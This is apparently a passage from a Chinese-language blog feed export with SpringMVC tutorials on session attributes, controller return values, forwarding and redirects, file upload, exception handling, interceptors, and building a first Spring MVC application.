private void showUser(String username, Map&lt;String, User&gt; map) &#123;      //模拟数据库查询，把查询到的数据传入 user 中      User user = new User();      user.setUsername(username);      user.setAge(19);      user.setBirthday(new Date());      map.put(&quot;abc&quot;, user);  &#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201025002833615.png#pic_center"></p><p><strong>7、SessionAttribute</strong>：</p><p>作用：</p><ul><li>用于多次执行控制器方法间的参数共享。</li></ul><p>属性：</p><ul><li>value：用于指定存入的属性名称</li><li>type：用于指定存入的数据类型</li></ul><p><strong>使用示例</strong>：</p><p>jsp 中的代码：</p><pre><code class="java">&lt;a href=&quot;testPut&quot;&gt;存入 SessionAttribute&lt;/a&gt;&lt;hr/&gt;&lt;a href=&quot;testGet&quot;&gt;取出 SessionAttribute&lt;/a&gt;&lt;hr/&gt;&lt;a href=&quot;testDel&quot;&gt;清除 SessionAttribute&lt;/a&gt;</code></pre><p>控制器中的代码：</p><pre><code class="java">@Controller@SessionAttributes(value = &#123;&quot;msg&quot;&#125;)//把 msg = 张三 存入到session域中public class HelloController &#123;       @RequestMapping(&quot;/testPut&quot;)    public String testPut(Model model) &#123;        System.out.println(&quot; testPut...&quot;);        //底层会存储到request域对象中        model.addAttribute(&quot;msg&quot;, &quot;张三&quot;);        return &quot;success&quot;;    &#125;    @RequestMapping(&quot;/testGet&quot;)    public String testGet(ModelMap model) &#123;        System.out.println(&quot;testGet...&quot;);        String msg = (String) model.get(&quot;msg&quot;);        System.out.println(msg);        return &quot;success&quot;;    &#125;    //完成会话，清除session域的值    @RequestMapping(&quot;/testDel&quot;)    public String testDel(SessionStatus status) &#123;        System.out.println(&quot;testDel...&quot;);        status.setComplete();        return &quot;success&quot;;    &#125;</code></pre><p>在success.jsp 中获取数据：</p><p><img src="https://img-blog.csdnimg.cn/20201024225011106.png#pic_center"><br>三个方法依次执行，结果如下：</p><p><strong>游览器</strong>：</p><p>存入：<br><img src="https://img-blog.csdnimg.cn/20201024225257212.png#pic_center"><br>删除：<br><img src="https://img-blog.csdnimg.cn/20201024225401139.png#pic_center"><br><strong>控制台</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20201024225431564.png#pic_center"></p><h4 id="七、响应数据和结果视图-："><a href="#七、响应数据和结果视图-：" class="headerlink" title="七、响应数据和结果视图 ："></a>七、响应数据和结果视图 ：</h4><h5 id="1、返回值分类："><a href="#1、返回值分类：" class="headerlink" title="1、返回值分类："></a>1、返回值分类：</h5><p><strong>1.1、返回字符串类</strong>：</p><p>Controller方法返回字符串可以指定逻辑视图的名称，根据视图解析器为物理视图的地址。</p><pre><code class="java">@RequestMapping(&quot;/testReturnString&quot;)public String testReturnString() &#123;    System.out.println(&quot;AccountController 的 testReturnString 方法执行了。。。。&quot;);    return &quot;success&quot;;&#125;</code></pre><p><strong>1.2、返回void</strong>：</p><p> 如果控制器的方法返回值编写成void，执行程序报404的异常，默认查找JSP页面没有找到。</p><p>默认会跳转到当前 RequestMapping注解 value值同名的 jsp 页面。</p><p>例：</p><p><img src="https://img-blog.csdnimg.cn/20201028192658291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>Controller页面：</p><pre><code class="java">@Controller@RequestMapping(&quot;/user&quot;)public class UserController &#123;    @RequestMapping(&quot;/testString&quot;)    public void testString() &#123;        System.out.println(&quot;testString方法执行了...&quot;);    &#125;&#125;</code></pre><p>这时可以新建 /WEB-INF/pages/user/testString.jsp 文件解决问题，或者可以使用<strong>请求转发</strong>或者<strong>重定向</strong>跳转到指定的页面。</p><p>例：</p><pre><code class="java">    @RequestMapping(&quot;/testReturnVoid&quot;)    public void testReturnVoid(HttpServletRequest request, HttpServletResponse response)            throws Exception &#123;        // 1、使用 request 转向页面，如下：        request.getRequestDispatcher(&quot;/WEB-INF/pages/success.jsp&quot;).forward(request, response);        //2、也可以通过 response 页面重定向：        response.sendRedirect( &quot;index.jsp&quot;);         //3、也可以通过 response 指定响应结果：        response.setCharacterEncoding(&quot;utf-8&quot;);        response.setContentType(&quot;application/json;charset=utf-8&quot;);        response.getWriter().write(&quot;json 串&quot;);    &#125;</code></pre><p>注意：</p><p>如果是重定向到 jsp 页面，则 jsp 页面必须在根目录下即 webapp目录下 ，不能写在 WEB-INF 目录中，否则无法找到。</p><p><strong>1.3、返回值是ModelAndView对象</strong>：</p><p>ModelAndView 是 SpringMVC 为我们提供的一个对象，该对象也可以用作控制器方法的返回值。</p><p>示例代码：</p><pre><code class="java"> @RequestMapping(&quot;/testReturnModelAndView&quot;)    public ModelAndView testReturnModelAndView() &#123;        ModelAndView mv = new ModelAndView();        mv.addObject(&quot;username&quot;, &quot;张三&quot;);        mv.setViewName(&quot;success&quot;);// 设置要跳转到的jsp的页面，是经过视图解析器的。        return mv;    &#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201028200111913.png#pic_center"></p><h5 id="2-SpringMVC框架提供的转发和重定向："><a href="#2-SpringMVC框架提供的转发和重定向：" class="headerlink" title="2. SpringMVC框架提供的转发和重定向："></a>2. SpringMVC框架提供的转发和重定向：</h5><p><strong>2.1、forward 转发</strong>：</p><p>controller 方法在提供了 String 类型的返回值之后，默认就是请求转发。也可以写成：</p><pre><code class="java">@RequestMapping(&quot;/testForward&quot;)public String testForward() &#123;    System.out.println(&quot;AccountController 的 testForward 方法执行了。。。。&quot;);    return &quot;forward:/WEB-INF/pages/success.jsp&quot;;&#125;</code></pre><p>它相当于 <code>request.getRequestDispatcher(&quot;url&quot;).forward(request,response)</code> 。使用请求转发，既可以转发到 jsp，也可以转发到其他的控制器方法。</p><p><strong>2.2、Redirect 重定向</strong>：</p><p>contrller 方法提供了一个 String 类型返回值之后，它需要在返回值里使用：redirect </p><pre><code class="java">@RequestMapping(&quot;/testRedirect&quot;)public String testRedirect() &#123;    System.out.println(&quot;AccountController 的 testRedirect 方法执行了。。。。&quot;);    return &quot;redirect:testReturnModelAndView&quot;;&#125;</code></pre><p>它相当于 <code>response.sendRedirect(url)</code>，同样的：如果是重定向到 jsp 页面，则 jsp 页面必须在根目录下即 webapp目录下 ，不能写在 WEB-INF 目录中，否则无法找到。</p><h4 id="八、SpringMVC-实现文件上传-："><a href="#八、SpringMVC-实现文件上传-：" class="headerlink" title="八、SpringMVC 实现文件上传 ："></a>八、SpringMVC 实现文件上传 ：</h4><h5 id="1-文件上传的回顾"><a href="#1-文件上传的回顾" class="headerlink" title="1. 文件上传的回顾:"></a>1. 文件上传的回顾:</h5><p><strong>1.1、文件上传的必要前提</strong>：</p><ul><li>form 表单的 enctype 取值必须是：multipart/form-data(默认值是:application/x-www-form-urlencoded) </li><li>enctype 是表单请求正文的类型</li><li>method 属性取值必须是 Post</li></ul><p><strong>1.2、文件上传的原理分析</strong>：</p><p>当 form 表单的 enctype 取值不是默认值后，<code>request.getParameter()</code> 将失效。</p><p>当 enctype = “application/x-www-form-urlencoded” 时，form 表单的正文内容是：<code>key=value&amp;key=value&amp;key=value</code></p><p>当 form 表单的 enctype 取值为 Mutilpart/form-data 时，请求正文内容就变成：</p><p>每一部分都是 MIME 类型描述的正文</p><pre><code class="java">-----------------------------7de1a433602ac  分界符Content-Disposition: form-data; name=&quot;userName&quot; 协议头aaa   协议的正文（文件内容）-----------------------------7de1a433602ac Content-Disposition: form-data; name=“file”;filename=“C:\Users\zhy\Desktop\fileupload_demofile\b.txt”Content-Type: text/plain    协议的类型（MIME 类型）bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb-----------------------------7de1a433602ac--</code></pre><p><strong>1.3、实现步骤</strong>:</p><ol><li>导入文件上传需要的jar包：</li></ol><pre><code class="html">&lt;dependency&gt;    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;    &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;commons-io&lt;/groupId&gt;    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;    &lt;version&gt;2.4&lt;/version&gt;&lt;/dependency&gt;</code></pre><ol start="2"><li>编写文件上传的JSP页面：</li></ol><pre><code class="html">&lt;form action=&quot;user/fileupload1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    选择文件：&lt;input type=&quot;file&quot; name=&quot;upload&quot;/&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;/&gt;&lt;/form&gt;</code></pre><ol start="3"><li>编写文件上传的Controller控制器：</li></ol><pre><code class="java">@RequestMapping(value = &quot;/fileupload1&quot;)    public String fileupload(HttpServletRequest request) throws Exception &#123;        // 先获取到要上传的文件目录        String path = request.getSession().getServletContext().getRealPath(&quot;/uploads&quot;);        System.out.println(path);        // 创建File对象，一会向该路径下上传文件        File file = new File(path);        // 判断路径是否存在，如果不存在，创建该路径        if (!file.exists()) &#123;            file.mkdirs();        &#125;        // 创建磁盘文件项工厂        DiskFileItemFactory factory = new DiskFileItemFactory();        ServletFileUpload fileUpload = new ServletFileUpload(factory);        // 解析request对象        List&lt;FileItem&gt; list = fileUpload.parseRequest(request);        // 遍历        for (FileItem fileItem : list) &#123;            // 判断文件项是普通字段，还是上传的文件            if (fileItem.isFormField()) &#123;            &#125; else &#123;                // 上传文件项                // 获取到上传文件的名称                String filename = fileItem.getName();                //生成唯一id，防止文件覆盖                String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;);//把uuid里的&quot;-&quot;替换成&quot;&quot;                filename = uuid + filename;                // 上传文件                fileItem.write(new File(file, filename));                // 删除临时文件                fileItem.delete();            &#125;        &#125;        return &quot;success&quot;;    &#125;</code></pre><h5 id="2、SpringMVC传统方式文件上传："><a href="#2、SpringMVC传统方式文件上传：" class="headerlink" title="2、SpringMVC传统方式文件上传："></a>2、SpringMVC传统方式文件上传：</h5><p>SpringMVC框架提供了MultipartFile对象，该对象表示上传的文件，要求<font color="red" >变量名称必须和表单file标签的name属性名称相同</font>。</p><p>即：</p><p><img src="https://img-blog.csdnimg.cn/20201029183136193.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201029183307667.png#pic_center"></p><ol><li>jsp页面：</li></ol><pre><code class="java">&lt;h3&gt;SpringMVC文件上传&lt;/h3&gt;&lt;form action=&quot;fileupload2&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    选择文件：&lt;input type=&quot;file&quot; name=&quot;upload&quot;/&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;/&gt;&lt;/form&gt;</code></pre><ol start="2"><li>控制器代码：</li></ol><pre><code class="java">@RequestMapping(value = &quot;/fileupload2&quot;)    public String fileupload2(HttpServletRequest request, MultipartFile upload) throws Exception &#123;        System.out.println(&quot;SpringMVC方式的文件上传...&quot;);        // 先获取到要上传的文件目录        String path = request.getSession().getServletContext().getRealPath(&quot;/uploads&quot;);        // 创建File对象，一会向该路径下上传文件        File file = new File(path);        // 判断路径是否存在，如果不存在，创建该路径        if (!file.exists()) &#123;            file.mkdirs();        &#125;        // 获取到上传文件的名称        String filename = upload.getOriginalFilename();        String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;);        // 把文件的名称唯一化        filename = uuid + &quot;_&quot; + filename;        // 上传文件        upload.transferTo(new File(file, filename));        return &quot;success&quot;;    &#125;</code></pre><p> 3、配置文件解析器对象：</p><pre><code class="java">    &lt;!-- 配置文件解析器对象，要求id名称必须是multipartResolver --&gt;    &lt;bean id=&quot;multipartResolver&quot;          class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;        &lt;property name=&quot;maxUploadSize&quot; value=&quot;10485760&quot;/&gt;    &lt;/bean&gt;</code></pre><p><strong>注意</strong>：</p><p> 一但采用 MultipartResolver 进行文件上传，MultipartResolver 根据请求头部的的 content-type 判断是否含有 ”multipart/form-data”。如果有，则把请求封装成 MultipartFile。</p><p>这时传统的上传方式就不能用了。</p><h5 id="3、SpringMVC跨服务器方式文件上传："><a href="#3、SpringMVC跨服务器方式文件上传：" class="headerlink" title="3、SpringMVC跨服务器方式文件上传："></a>3、SpringMVC跨服务器方式文件上传：</h5><p><strong>1、分服务器的目的</strong>：</p><p>在实际开发中，会有很多处理不同功能的服务器。例如：</p><ul><li>应用服务器：负责部署我们的应用</li><li>数据库服务器：运行我们的数据库</li><li>缓存和消息服务器：负责处理大并发访问的缓存和消息</li><li>文件服务器：负责存储用户上传文件的服务器。</li></ul><p>分服务器处理的目的是让服务器各司其职，从而提高项目的运行效率。</p><p><img src="https://img-blog.csdnimg.cn/20201029205338323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>实现步骤：</p><p>1、创建两个web项目，其中一个作为上传服务器使用，并都在tomcat 进行发布。</p><p>2、实现SpringMVC跨服务器方式文件上传：</p><ol><li>导入开发需要的jar包：<pre><code class="xml">&lt;dependency&gt; &lt;groupId&gt;com.sun.jersey&lt;/groupId&gt; &lt;artifactId&gt;jersey-core&lt;/artifactId&gt; &lt;version&gt;1.18.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.sun.jersey&lt;/groupId&gt; &lt;artifactId&gt;jersey-client&lt;/artifactId&gt; &lt;version&gt;1.18.1&lt;/version&gt;&lt;/dependency&gt;</code></pre></li><li>编写文件上传的JSP页面：</li></ol><pre><code class="java">&lt;h3&gt;跨服务器文件上传&lt;/h3&gt;&lt;form action=&quot;fileupload3&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    选择文件：&lt;input type=&quot;file&quot; name=&quot;upload&quot;/&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;/&gt;&lt;/form&gt;</code></pre><ol start="3"><li>编写控制器：</li></ol><pre><code class="java">  @RequestMapping(value = &quot;/fileupload3&quot;)    public String fileupload3(MultipartFile upload) throws Exception &#123;        System.out.println(&quot;SpringMVC跨服务器方式的文件上传...&quot;);        // 定义图片服务器的请求路径        String path = &quot;http://localhost:9090/fileupload/uploads /&quot;;        // 获取到上传文件的名称        String filename = upload.getOriginalFilename();        String uuid = UUID.randomUUID().toString().replaceAll(&quot;-&quot;, &quot;&quot;).toUpperCase();        // 把文件的名称唯一化        filename = uuid + &quot;_&quot; + filename;        // 向图片服务器上传文件        // 创建客户端对象        Client client = Client.create();        // 连接图片服务器        WebResource webResource = client.resource(path + filename);        // 上传文件        webResource.put(upload.getBytes());        return &quot;success&quot;;    &#125;</code></pre><p>需要注意的是：图片服务器里的 uploads 文件需要自己创建，在Tomcat 服务器的 webapps的根目录下创建。</p><p><img src="https://img-blog.csdnimg.cn/20201029210616834.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201029210650604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>上传成功。</p><h4 id="九、SpringMVC-中的异常处理："><a href="#九、SpringMVC-中的异常处理：" class="headerlink" title="九、SpringMVC 中的异常处理："></a>九、SpringMVC 中的异常处理：</h4><p>若遇到错误或者异常，返回给用户一个良好的错误信息比直接返回报错的游览器页面要好的多。</p><p>当系统的 dao、service、controller 出现异常时都是向上抛出的，最后由 springmvc 前端控制器交由异常处理器进行异常处理，如下图：</p><p><img src="https://img-blog.csdnimg.cn/20201030103136899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>1、SpringMVC的异常处理</strong>：</p><ul><li>模拟异常信息：</li></ul><pre><code class="java">@Controller@RequestMapping(&quot;/user&quot;)public class UserController &#123;    @RequestMapping(&quot;/testException&quot;)    public String testException() throws SysException &#123;        System.out.println(&quot;testException执行了...&quot;);        try &#123;            //模拟异常            int a = 10 / 0;        &#125; catch (Exception e) &#123;            //控制台打印异常信息            e.printStackTrace();            //抛出自定义异常类信息            throw new SysException(&quot;查询所有用户出现了错误！&quot;);        &#125;        return &quot;success&quot;;    &#125;&#125;</code></pre><ol><li>自定义异常类：</li></ol><pre><code class="java">public class SysException extends Exception &#123;    private String message;    public String getMessage() &#123;        return message;    &#125;    public SysException(String message) &#123;        this.message = message;    &#125;&#125;</code></pre><ol start="2"><li>自定义异常处理器：</li></ol><pre><code class="java">public class SysExceptionResolver implements HandlerExceptionResolver &#123;    @Override    public ModelAndView resolveException(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception ex) &#123;        SysException e = null;        // 获取到异常对象        //如果抛出的是系统自定义异常则直接转换        if (ex instanceof SysException) &#123;            e = (SysException) ex;        &#125; else &#123;            e = new SysException(&quot;请联系管理员&quot;);        &#125;        ModelAndView mv = new ModelAndView();        // 存入错误的提示信息        mv.addObject(&quot;message&quot;, e.getMessage());        // 跳转的Jsp页面        mv.setViewName(&quot;error&quot;);        return mv;    &#125;&#125;</code></pre><ol start="3"><li>配置异常处理器</li></ol><pre><code class="html">&lt;!-- 配置异常处理器 --&gt;&lt;bean id=&quot;sysExceptionResolver&quot; class=&quot;cn.itcast.exception.SysExceptionResolver&quot;/&gt;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201030112359217.png#pic_center"></p><h4 id="十、SpringMVC框架中的拦截器"><a href="#十、SpringMVC框架中的拦截器" class="headerlink" title="十、SpringMVC框架中的拦截器"></a>十、SpringMVC框架中的拦截器</h4><p><strong>1、拦截器的作用</strong>：</p><p>1、Spring MVC 的处理器拦截器类似于 Servlet 开发中的过滤器 Filter，用于对处理器进行预处理和后处理。用户可以自己定义一些拦截器来实现特定的功能。</p><p>2、 可以定义拦截器链，连接器链就是将拦截器按着一定的顺序结成一条链，在访问被拦截的方法时，拦截器链中的拦截器会按着定义的顺序执行。</p><p>3、拦截器和过滤器的功能比较类似，区别是：</p><ul><li>过滤器是 servlet 规范中的一部分，任何 java web 工程都可以使用。</li><li>拦截器是 SpringMVC 框架自己的，只有使用了 SpringMVC 框架的工程才能用。</li><li>过滤器在 url-pattern 中配置了/*之后，可以对所有要访问的资源拦截。</li><li>拦截器它是只会拦截访问的控制器方法，如果访问的是 jsp，html,css,image 或者 js 是不会进行拦截的。</li></ul><p>想要自定义拦截器， 要求必须实现：HandlerInterceptor 接口。</p><p><strong>2、自定义拦截器的步骤</strong>：</p><p>2.1、 创建类，实现HandlerInterceptor接口：</p><pre><code class="java">public class MyInterceptor1 implements HandlerInterceptor &#123;    /**     * controller方法执行前，进行拦截的方法     * return true放行     * return false拦截     * 可以使用转发或者重定向直接跳转到指定的页面。     */    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        System.out.println(&quot;preHandle 方法执行了...&quot;);        return true;    &#125;    /**     * controller方法执行后，进行拦截的方法     * 可以使用转发或者重定向直接跳转到指定的页面。     */    @Override    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;        System.out.println(&quot;postHandle 方法执行了&quot;);    &#125;    /**     * JSP执行后执行     * 不可以使用转发或者重定向直接跳转到指定的页面。     */    @Override    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;        System.out.println(&quot;afterCompletion 方法执行了&quot;);    &#125;&#125;</code></pre><p>2.2、 在springmvc.xml中配置拦截器类：</p><pre><code class="java">  &lt;!-- 配置拦截器 --&gt;    &lt;mvc:interceptors&gt;        &lt;mvc:interceptor&gt;            &lt;!-- 哪些方法进行拦截 --&gt;            &lt;mvc:mapping path=&quot;/*&quot;/&gt;            &lt;!-- 注册拦截器对象 --&gt;            &lt;bean class=&quot;com.smk.interceptor.MyInterceptor1&quot;/&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;</code></pre><p>2.3、controller 类代码：</p><pre><code class="java">@Controllerpublic class UserController &#123;    @RequestMapping(&quot;/testInterceptor&quot;)    public String testInterceptor() &#123;        System.out.println(&quot;testInterceptor执行了...&quot;);        return &quot;success&quot;;    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201103194632833.png#pic_center"><br><strong>3、HandlerInterceptor接口中的方法</strong>：</p><p>1、preHandle方法是controller方法执行前拦截的方法</p><ol><li>可以使用request或者response跳转到指定的页面 </li><li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li><li>return false不放行，不会执行controller中的方法。</li></ol><p>2、 postHandle是controller方法执行后执行的方法，在JSP视图执行前。</p><ol><li>可以使用request或者response跳转到指定的页面</li><li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li><li>如果controller 被拦截了则不会执行。</li></ol><p>3、afterCompletion方法是在DispatcherServlet进行视图的渲染之后执行</p><ol><li>request或者response不能再跳转页面了</li><li>如果controller方法被拦截了，也会执行！</li></ol><p><strong>4、 配置多个拦截器</strong>：</p><p> 配置第2个拦截器</p><pre><code class="java">    &lt;!-- 配置拦截器 --&gt;    &lt;mvc:interceptors&gt;        &lt;mvc:interceptor&gt;            &lt;!-- 哪些方法进行拦截 --&gt;            &lt;mvc:mapping path=&quot;/user/*&quot;/&gt;            &lt;!-- 注册拦截器对象 --&gt;            &lt;bean class=&quot;com.smk.interceptor.MyInterceptor1&quot;/&gt;        &lt;/mvc:interceptor&gt;        &lt;mvc:interceptor&gt;            &lt;!-- 哪些方法进行拦截 --&gt;            &lt;mvc:mapping path=&quot;/**&quot;/&gt;            &lt;!-- 注册拦截器对象 --&gt;            &lt;bean class=&quot;com.smk.interceptor.MyInterceptor2&quot;/&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201103201210882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaEE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一个Spring MVC程序</title>
      <link href="2020/11/03/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AASpring%20MVC%E7%A8%8B%E5%BA%8F/"/>
      <url>2020/11/03/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AASpring%20MVC%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p> <strong>1、先简单说一下SpringMVC的概念</strong>：</p><ul><li>Spring MVC是Spring为表现层提供的基于MVC设计模式的轻量级Web框架，是目前最主流的 MVC框架之一。它与Struts2框架一样，都属于MVC框架，但其使用和性能等方面比Struts2更加优异。</li></ul><p><strong>2、Spring MVC具有以下特点</strong>：</p><ol><li>是Spring框架的一部分，可以方便的利用Spring所提供的其他功能。</li><li>灵活性强，易于与其他框架集成。</li><li>提供了一个前端控制器DispatcherServlet，使开发人员无需额外开发控制器对象。</li><li>可自动绑定用户输入，并能正确的转换数据类型。</li><li>内置了常见的校验器，可以校验用户输入。如果校验不能通过，那么就会重定向到输入表单。</li><li>支持多种视图技术。它支持JSP、Velocity和FreeMarker等视图技术。</li><li>使用基于XML的配置文件，在编辑后，不需要重新编译应用程序。</li></ol><p><strong>3、SpringMVC在三层架构的位置</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200930171640705.png" alt="在这里插入图片描述"><hr></p><h3 id="第一个Spring-MVC程序"><a href="#第一个Spring-MVC程序" class="headerlink" title="第一个Spring MVC程序"></a>第一个Spring MVC程序</h3><p><strong>第一步：新建web项目：</strong></p><ul><li>在eclipse中，新建一个名字为SpringMvc的Web项目，在项目的lib目录中添加运行Spring MVC程序所需要的JAR包，并发布到类路径下。</li></ul><p>必须的 jar包如下：</p><p><img src="https://img-blog.csdnimg.cn/20200930174641501.png" alt="在这里插入图片描述"></p><ul><li>项目中添加了Spring的4个核心JAR包、commons-logging的JAR以及两个web相关的JAR，这两个web相关的JAR包就是Spring MVC框架所需的JAR包。</li></ul><p><strong>第二步：配置XML</strong></p><ul><li>在web.xml中，配置Spring MVC的前端控制器DispatcherServlet</li></ul><p>如下：</p><pre><code class="java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;    xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;    id=&quot;WebApp_ID&quot; version=&quot;4.0&quot;&gt;    &lt;display-name&gt;SpringMvc&lt;/display-name&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;--当前Servlet的参数信息--&gt;        &lt;init-param&gt;            &lt;--contextConfigLocation是参数名称，该参数的值包含了SpringMVC的配置文件路径--&gt;            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;            &lt;param-value&gt;classpath:springmvc-config.xml&lt;/param-value&gt;        &lt;/init-param&gt;        &lt;--定义在Web应用启动是立即加载Servlet--&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;--请求对应的Servlet名称--&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;--监听当前域的所有请求--&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><p><strong>第三步：编写 Controller</strong>：</p><ul><li>在src目录下，创建一个com.itheima.controller包，并在包中创建控制器类FirstController，该类需要实现Controller接口，编辑后如下所示:</li></ul><pre><code class="java">public class FirstController implements Controller &#123;    @Override    public ModelAndView handleRequest(HttpServletRequest arg0, HttpServletResponse arg1) throws Exception &#123;        // TODO Auto-generated method stub        ModelAndView mav = new ModelAndView();        // 添加模型数据，可以是任何的POJO对象        mav.addObject(&quot;msg&quot;, &quot;这是我的第一个Spring MVC程序&quot;);        // 设置逻辑视图名，视图解析器会根据该名字解析到具体的视图页面        mav.setViewName(&quot;/WEB-INF/jsp/first.jsp&quot;);        // 返回ModelAndView 对象        return mav;    &#125;&#125;</code></pre><p><strong>4、第四步：编辑 dispatcher-servlet.xml</strong></p><ul><li>在src目录下，创建配置文件springmvc-config.xml，这个文件名的开头与上面 web.xml 中的 <code>&lt;servlet-name&gt;</code> 元素配置的 dispatcher 对应，这是 Spring MVC 的映射配置文件（格式：xxx-servlet.xml）</li></ul><pre><code class="java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!--配置Handle，映射&quot;/hello&quot;请求 --&gt;    &lt;bean name=&quot;/hello&quot; class=&quot;com.itheima.controller.FirstController&quot; /&gt;    &lt;!-- 处理器映射器，将处理器Handle的name作为url进行查找 --&gt;    &lt;bean        class=&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot; /&gt;    &lt;!-- 处理器适配器，配置对处理器中handleRequest()方法的调用 --&gt;    &lt;bean        class=&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot; /&gt;    &lt;!-- 配置视图解析器 --&gt;    &lt;bean        class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; /&gt;&lt;/beans&gt;</code></pre><p><strong>第五步：准备 first.jsp</strong></p><ul><li> 在WEB-INF目录下，创建一个jsp文件夹，并在文件夹中创建一个页面文件first.jsp，在该页面中使用EL表达式获取msg中的信息，如下所示：</li></ul><pre><code class="java">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;    pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;Insert title here&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    $&#123;msg&#125;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>第六步： 部署 Tomcat 及相关环境</strong>：</p><ul><li>将SpringMvc 项目发布到Tomcat中，并启动Tomcat服务器。在浏览器中访问地址：<a href="http://localhost:8080/SpringMvc/hello%EF%BC%8C%E5%85%B6%E6%98%BE%E7%A4%BA%E6%95%88%E6%9E%9C%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%EF%BC%9A">http://localhost:8080/SpringMvc/hello，其显示效果如下所示：</a></li></ul><p><img src="https://img-blog.csdnimg.cn/20200930183954310.png" alt="在这里插入图片描述"></p><p>至此第一个Spring MVC程序就此完成了（￣︶￣）↗　